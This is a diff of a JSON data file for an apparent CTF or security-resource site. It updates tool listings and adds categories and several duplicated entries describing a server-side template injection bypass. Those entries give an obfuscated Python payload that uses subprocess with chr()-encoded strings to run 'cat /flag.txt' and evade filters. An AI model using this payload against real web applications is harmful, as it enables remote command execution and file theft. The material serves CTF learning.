@@ -18,7 +18,7 @@
             "rating": 4.8,
             "ratings_count": 150,
             "description_html": "<p>An integrated platform for performing security testing of web applications. Features include:</p>\n<ul>\n<li>Intercepting proxy</li>\n<li>Web vulnerability scanner</li>\n<li>Intruder tool</li>\n<li>Repeater tool</li>\n<li>Sequencer tool</li>\n<li>Decoder tool</li>\n<li>Comparer tool</li>\n<li>Extender tool</li>\n</ul>",
-            "views": 4
+            "views": 19
         },
         {
             "id": 2,
@@ -37,7 +37,7 @@
             "rating": 4.590163934426229,
             "ratings_count": 122,
             "description_html": "<p>Ghidra is a software reverse engineering (SRE) suite of tools developed by NSA's Research Center in support of the Cybersecurity mission.</p>\n<p>Key features:\n- Decompiler\n- Disassembler\n- Scripting\n- Graph visualization\n- Version control integration</p>",
-            "views": 8
+            "views": 10
         },
         {
             "id": 3,
@@ -56,7 +56,7 @@
             "rating": 4.7,
             "ratings_count": 90,
             "description_html": "<p>John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, BeOS, and OpenVMS.</p>\n<p>Features:\n- Multiple hash types support\n- Wordlist-based cracking\n- Rule-based cracking\n- Incremental mode\n- Distributed cracking</p>",
-            "views": 3
+            "views": 4
         },
         {
             "id": 4,
@@ -98,18 +98,73 @@
             "ratings_count": 60
         },
         {
-            "name": "a",
-            "category": "rev",
+            "name": "SSTI - RCE Bypass Using subprocess",
+            "category": "web",
             "tags": [
-                "asd"
+                "SSTI",
+                "Server Side Template Injection"
             ],
-            "description": "asdasd",
-            "url": "https://ldce.ac.in",
-            "id": 6,
-            "date_added": "2025-04-01T22:07:40.576028",
+            "description": "Use subprocess dynamically to execute system commands.\n\nPayload:\n\ngetattr(__import__('subprocess'), 'check_output')(\n    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]\n).decode()\n\nBreakdown:\n\n__import__('subprocess') \u2192 Dynamically imports subprocess.\n\ngetattr(..., 'check_output') \u2192 Accesses check_output without using ..\n\n[chr(99)+chr(97)+chr(116), ...] \u2192 Builds ['cat', '/flag.txt'] dynamically.\n\n.decode() \u2192 Converts output from bytes to a readable string.\n\nUsage:\n\nCan be used in SSTI scenarios where os is blocked.\n\nWorks if subprocess is accessible.\n\nHelps bypass filters that restrict . or direct function calls.\n\n",
+            "url": "http://temp.com",
+            "id": 7,
+            "date_added": "2025-04-02T16:09:29.008649",
             "added_by": "Anonymous",
             "rating": 0,
-            "ratings_count": 0
+            "ratings_count": 0,
+            "views": 8,
+            "description_html": "<p>Use subprocess dynamically to execute system commands.</p>\n<p>Payload:</p>\n<p>getattr(<strong>import</strong>('subprocess'), 'check_output')(\n    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]\n).decode()</p>\n<p>Breakdown:</p>\n<p><strong>import</strong>('subprocess') \u2192 Dynamically imports subprocess.</p>\n<p>getattr(..., 'check_output') \u2192 Accesses check_output without using ..</p>\n<p>[chr(99)+chr(97)+chr(116), ...] \u2192 Builds ['cat', '/flag.txt'] dynamically.</p>\n<p>.decode() \u2192 Converts output from bytes to a readable string.</p>\n<p>Usage:</p>\n<p>Can be used in SSTI scenarios where os is blocked.</p>\n<p>Works if subprocess is accessible.</p>\n<p>Helps bypass filters that restrict . or direct function calls.</p>"
+        },
+        {
+            "name": "name",
+            "category": "web",
+            "tags": [
+                "tags"
+            ],
+            "description": "this is description",
+            "url": "https://ldce.ac.in",
+            "id": 8,
+            "date_added": "2025-04-02T16:32:00.286660",
+            "added_by": "Anonymous",
+            "rating": 0,
+            "ratings_count": 0,
+            "views": 1,
+            "description_html": "<p>this is description</p>"
+        },
+        {
+            "id": 9,
+            "name": "SSTI - RCE Bypass Using subprocess",
+            "category": "article",
+            "tags": [
+                "web",
+                "SSTI",
+                "server side template injection"
+            ],
+            "url": "",
+            "description": "<p>Use subprocess dynamically to execute system commands.</p>\r\n<p>\u00a0</p>\r\n<h2>Payload</h2>\r\n<p><code>getattr(<strong>import</strong>('subprocess'), 'check_output')( [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)] ).decode()</code></p>\r\n<p>\u00a0</p>\r\n<h2>Breakdown</h2>\r\n<p><code><strong>import</strong>('subprocess')</code> \u2192 Dynamically imports subprocess.</p>\r\n<p><code>getattr(..., 'check_output')</code> \u2192 Accesses check_output without using ..</p>\r\n<p><code>[chr(99)+chr(97)+chr(116), ...]</code> \u2192 Builds ['cat', '/flag.txt'] dynamically.</p>\r\n<p><code>.decode()</code> \u2192 Converts output from bytes to a readable string.</p>\r\n<p>\u00a0</p>\r\n<h2>Usage</h2>\r\n<p>Can be used in SSTI scenarios where os is blocked.</p>\r\n<p>Works if subprocess is accessible.</p>\r\n<p>Helps bypass filters that restrict . or direct function calls.</p>",
+            "file_path": null,
+            "date_added": "2025-04-02T19:52:29.740524",
+            "added_by": "Anonymous",
+            "rating": 0,
+            "ratings_count": 0,
+            "views": 2,
+            "description_html": "<p>Use subprocess dynamically to execute system commands.</p>\n<p>\u00a0</p>\n<h2>Payload</h2>\n<p><code>getattr(<strong>import</strong>('subprocess'), 'check_output')( [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)] ).decode()</code></p>\n<p>\u00a0</p>\n<h2>Breakdown</h2>\n<p><code><strong>import</strong>('subprocess')</code> \u2192 Dynamically imports subprocess.</p>\n<p><code>getattr(..., 'check_output')</code> \u2192 Accesses check_output without using ..</p>\n<p><code>[chr(99)+chr(97)+chr(116), ...]</code> \u2192 Builds ['cat', '/flag.txt'] dynamically.</p>\n<p><code>.decode()</code> \u2192 Converts output from bytes to a readable string.</p>\n<p>\u00a0</p>\n<h2>Usage</h2>\n<p>Can be used in SSTI scenarios where os is blocked.</p>\n<p>Works if subprocess is accessible.</p>\n<p>Helps bypass filters that restrict . or direct function calls.</p>"
+        },
+        {
+            "id": 10,
+            "name": "SSTI",
+            "category": "website",
+            "tags": [
+                "web"
+            ],
+            "url": "",
+            "description": "<div class=\"description markdown-content mb-4\">\r\n<p>Use subprocess dynamically to execute system commands.</p>\r\n<h2>Payload</h2>\r\n<p><code>getattr(<strong>import</strong>('subprocess'), 'check_output')( [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)] ).decode()</code></p>\r\n<h2>Breakdown</h2>\r\n<p><strong>import</strong>('subprocess') \u2192 Dynamically imports subprocess.</p>\r\n<p>getattr(..., 'check_output') \u2192 Accesses check_output without using ..</p>\r\n<p>[chr(99)+chr(97)+chr(116), ...] \u2192 Builds ['cat', '/flag.txt'] dynamically.</p>\r\n<p>.decode() \u2192 Converts output from bytes to a readable string.</p>\r\n<p>Usage:</p>\r\n<p>Can be used in SSTI scenarios where os is blocked.</p>\r\n<p>Works if subprocess is accessible.</p>\r\n<p>Helps bypass filters that restrict . or direct function calls.</p>\r\n</div>\r\n<div class=\"metadata\">\r\n<p>\u00a0</p>\r\n</div>",
+            "file_path": null,
+            "date_added": "2025-04-02T19:54:40.312414",
+            "added_by": "Anonymous",
+            "rating": 0,
+            "ratings_count": 0,
+            "views": 3,
+            "description_html": "<div class=\"description markdown-content mb-4\">\n<p>Use subprocess dynamically to execute system commands.</p>\n<h2>Payload</h2>\n<p><code>getattr(<strong>import</strong>('subprocess'), 'check_output')( [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)] ).decode()</code></p>\n<h2>Breakdown</h2>\n<p><strong>import</strong>('subprocess') \u2192 Dynamically imports subprocess.</p>\n<p>getattr(..., 'check_output') \u2192 Accesses check_output without using ..</p>\n<p>[chr(99)+chr(97)+chr(116), ...] \u2192 Builds ['cat', '/flag.txt'] dynamically.</p>\n<p>.decode() \u2192 Converts output from bytes to a readable string.</p>\n<p>Usage:</p>\n<p>Can be used in SSTI scenarios where os is blocked.</p>\n<p>Works if subprocess is accessible.</p>\n<p>Helps bypass filters that restrict . or direct function calls.</p>\n</div>\n<div class=\"metadata\">\n<p>\u00a0</p>\n</div>"
         }
     ],
     "users": [
@@ -119,5 +174,49 @@
             "password_hash": "pbkdf2:sha256:260000$YOUR_HASH_HERE"
         }
     ],
-    "favorites": {}
+    "favorites": {},
+    "categories": [
+        {
+            "id": 1,
+            "name": "Web Exploitation",
+            "slug": "web",
+            "icon": "fas fa-globe"
+        },
+        {
+            "id": 2,
+            "name": "Cryptography",
+            "slug": "crypto",
+            "icon": "fas fa-key"
+        },
+        {
+            "id": 3,
+            "name": "Reverse Engineering",
+            "slug": "rev",
+            "icon": "fas fa-microchip"
+        },
+        {
+            "id": 4,
+            "name": "Binary Exploitation",
+            "slug": "pwn",
+            "icon": "fas fa-bug"
+        },
+        {
+            "id": 5,
+            "name": "Forensics",
+            "slug": "forensics",
+            "icon": "fas fa-search"
+        },
+        {
+            "id": 7,
+            "name": "Network",
+            "slug": "network",
+            "icon": "fa-solid fa-globe"
+        },
+        {
+            "id": 8,
+            "name": "Miscellaneous",
+            "slug": "misc",
+            "icon": "fas fa-puzzle-piece"
+        }
+    ]
 }
